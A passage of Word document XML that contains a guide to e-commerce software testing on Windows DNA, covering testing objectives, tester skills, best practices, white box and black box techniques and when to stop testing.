        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Insufficient testing is also a major source of breakdown of e-commerce systems during operations, as testing must be done during all phases of development.</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Inadequate requirements gathering</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>A short time to market results in developers starting work on the Web site development without truly understanding the business and technical requirements.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t xml:space="preserve"> For example, the intricacies of state tax calculation can result in shipping costs that may not be completely understood and therefore calculated improperly. Also, developers may create client-side scripts using language that may not work on some client browsers.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Introducing complex business processes into an e-commerce system</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Modeling business processes and human interaction into an e-commerce system can be a complex task. As more business processes are automated, the complexity of the system increases and leads to an increased chance of errors.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lastRenderedPageBreak/>
        <w:t>Keeping pace with the fast changing e-commerce technology</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>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Objectives of Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Testing is essential because of:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="182"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Software reliability</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="182"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Software quality</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="182"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>System assurance</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="182"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Optimum performance and capacity utilization</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="182"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Price of non-conformance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Software reliability</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>E-commerce requires software that performs critical tasks, such as creating storefront and a shopping cart, collecting customer data, and providing the payment gateway. This software needs to function correctly.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Testing assures the organization of the quality and integrity of the e-commerce solution.</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Software quality</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Software quality is characterized by the correctness of program logic and implementation. It begins with testing the software during development.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The developer must test each module to make sure that it functions correctly at the time it is written or modified. Test values and boundary conditions must both be verified. Next, the module should undergo interface testing to check for functional errors. Only after the module works correctly can it be released for testing to the larger system. Early detection of errors saves rework and prevents a problem from becoming more complex in nature. As a result, error detection during the operation of a system incurs greater direct and indirect costs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>At a higher level, the interaction of individually correct components must be tested. For example, if a customer enters the details of their credit card payment and are disconnected before the order confirmation, the software must indicate the status of the transaction when the customer reconnects to the e-commerce site. If the software functions otherwise, it does not meet organization requirements.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Another instance of the quality of software is that of accurate tax and shipping calculations. Because all states have different tax systems and some of them are complex, it becomes difficult for the developer to integrate all the tax structures with multi-location shipping. This raises the complexity of the software and increases the chance of errors.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System assurance</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The main purpose of system assurance is to deliver a quality product. Conformance to requirements increases the organization’s confidence in the system.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>An e-commerce system deals with three parties: the bank, the transaction clearinghouse, and the customer. The interdependency of these three parties makes the process of buying and selling over the Internet more critical than in real life. If the faith of any of these parties dwindles in the e-commerce site, the entrepreneurs can lose a lot of money, as well as their reputation.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>For example, in the case of a faulty e-commerce system, the credit card of the customer may be billed immediately for the complete order, when only a partial order has been filled. Testing must assure that partial order fulfillment and billing are done correctly.</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Optimum performance and capacity utilization</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Another purpose of testing is to ensure optimum performance and capacity utilization of e-commerce system components. The purpose of stress or capacity testing/planning is to make sure that the Web site is able to perform acceptably at peak usage.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>For example, during the Christmas shopping season the Web site loads increase significantly. To handle this, the e-commerce solution must be able to handle the anticipated load with minimal degradation.</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Price of non-conformance</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The main purpose of testing is to detect errors and error-prone areas in a system. Testing must be thorough and well planned. A partially tested system is as bad as an untested system. And the price of an untested and under-tested system is high.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The following list suggests some of the potential fallouts of an untested or under-tested e-commerce system:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="183"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Legal suits against the entrepreneur due to a faulty transaction system. This type of system may not have been tested for transaction software functionality. Losses include millions of dollars, not to mention the entrepreneur’s reputation.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="183"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Loss of critical data from the database can result in untraceable transactions. This could again invite legal action and losses due to the digression of site visitors to competitors’ sites.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="183"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Insecure transactions can cause losses to customers and may result in the withdrawal of certification by the security certification agency.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="183"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>System breakdown if the system has not been tested for load. A system breakdown results in loss of time due to restoration of service. Fixing the error can involve both direct and indirect costs.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Testing Team</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The testing team needs to be carefully selected. An inexperienced testing team may not be able to test the system thoroughly.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>A tester should be familiar with the technology, the business, and the customer requirements. Testing on Microsoft Windows DNA requires that the tester is proficient with the three layers of the architecture. They must be familiar with how the technologies interrelate.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>For testing applications on the Web tier, the tester should have an understanding of the different browsers, such as Microsoft Internet Explorer, Netscape, AOL, and Microsoft WebTV®. The tester must also understand ASP, HTML, DHTML, Java, and VBScript because they are relevant to the Web tier. Testing applications on the middle tier requires the tester to be aware of business logic. This includes the Web server applications, tax and shipping calculations, discount, up-sell and down-sell mechanisms, and shopping cart functionalities.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The tester must be proficient with the database software, Microsoft SQL Server™ commands, and file and storage systems for testing applications on the data tier of Windows DNA.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>For more information on staffing, see Identifying Staffing Roles for E-Commerce Operations.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lastRenderedPageBreak/>
        <w:t>Best Practices</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>While testing a system, follow these steps:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="184"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Prepare comprehensive test plan specifications and test cases for each level of testing. Supplement these with the test data and test logs. Test plans for system testing may involve operators and test plans because acceptance testing involves customers.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="184"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Design the test cases to test system restrictions, such as file and database size (stress testing).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="184"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Develop the data to test specific cases. Copies of live files must not be used except for Acceptance testing.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="184"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Do not use confidential data for testing without written authorization, especially in the case of Acceptance testing.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="184"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Follow relevant standards.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="184"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Perform Regression testing on each component of the system. This ensures that no anomalies have crept into the system because of the changes made to the system.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="184"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Make sure to document and set up the test environment for each level in advance of testing. Test environments specify the preconditions required to perform the tests.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="184"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Specify the intended test coverage as part of the test plan. Test coverage is the degree to which specific test cases address all specified requirements for a specific system or component.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="label"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>White Box and Black Box testing techniques</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262"/>
        <w:gridCol w:w="2451"/>
      </w:tblGrid>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="24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White Box Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="26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Black Box Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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Complete Path Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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Equivalence Partitioning</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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Branch or Decision</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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Boundary Value Analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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Condition Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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Cause Effect Graphing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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Data Flow Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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Syntax Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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Loop Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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 </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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lastRenderedPageBreak/>
        <w:t>When to Stop Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>At the beginning of the testing process, plan on the amount of testing to be done. Base these plans on assumptions about the quality of the system to be tested.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Often, testing stops when the schedule runs out. A more efficient testing plan provides for a stop to testing when no further errors are found with existing tests, or when the number of errors found is below an acceptance threshold.</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Challenges of E-Commerce Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>E-commerce testing is not easy. With rapid changes in technology and improvement in hardware and software, the tester finds it difficult to standardize tools or techniques for e-commerce testing. The following are some of the challenges of e-commerce testing:</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Rapid change of technology in e-commerce</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Rapid change in e-commerce technologies keeps the developer and the tester on their toes. As newer hardware and software bring better functionality, their conditions for testing become different every time they change. This causes the tester to have to create new environments each time.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Varied customer profiles</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
